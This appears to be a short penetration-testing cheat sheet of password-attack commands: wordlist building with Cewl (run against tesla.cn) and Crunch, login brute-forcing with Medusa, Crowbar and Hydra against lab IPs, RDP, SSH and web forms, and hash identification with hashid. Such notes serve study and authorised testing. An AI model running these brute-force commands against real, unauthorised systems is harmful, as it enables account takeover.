### Cewl
```
cewl https://www.tesla.cn -v -a -m 1 -w tesla.txt
```

### Crunch
```
crunch 8(min) 8(max) -t ,@@^^%%%

PLACEHOLDER	CHARACTER TRANSLATION
@	Lower case alpha characters
,	Upper case alpha characters
%	Numeric characters
^	Special characters including space

crunch 4 6 0123456789ABCDEF(char set) -o crunch.txt
```
### Medusa
###### HTTP htaccess Attack with Medusa
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
medusa -d(check out supported modules)
```

### Crowbar
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
### Hydra
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f(stop the attack when the first successful result is found)
```
### Hash Identification
```
hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
hashid '$6$l5bL6XIASslBwwUD$bCxeTlbhTH76wE.bI66aMYSeDXKQ8s7JNFwa1s1KkTand6ZsqQKAF3G0tHD9bd59e5NAz/s7DQcAojRTWNpZX0'
```
